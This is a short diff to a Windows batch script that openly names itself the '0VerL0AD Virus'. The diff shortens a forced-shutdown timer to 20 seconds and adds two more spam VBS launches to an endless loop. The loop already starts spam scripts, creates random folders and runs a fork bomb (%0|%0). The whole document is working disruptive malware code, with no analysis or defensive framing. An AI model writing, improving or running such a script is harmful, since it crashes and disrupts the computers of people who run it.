@@ -1,6 +1,6 @@
 @echo off
 
-shutdown -s -t 70 -c "Your computer has been fucked by the 0VerL0AD Virus!"
+shutdown -s -t 20 -c "Your computer has been fucked by the 0VerL0AD Virus!"
 goto b
 
 :b
@@ -8,8 +8,9 @@ goto b
  start spambox2.vbs
  start spambox3.vbs
  start spambox4.vbs
+ start kblightspam.vbs
+ start diskdrivespam.vbs
 md %random%
 /folder.
 %0|%0
 goto b
-
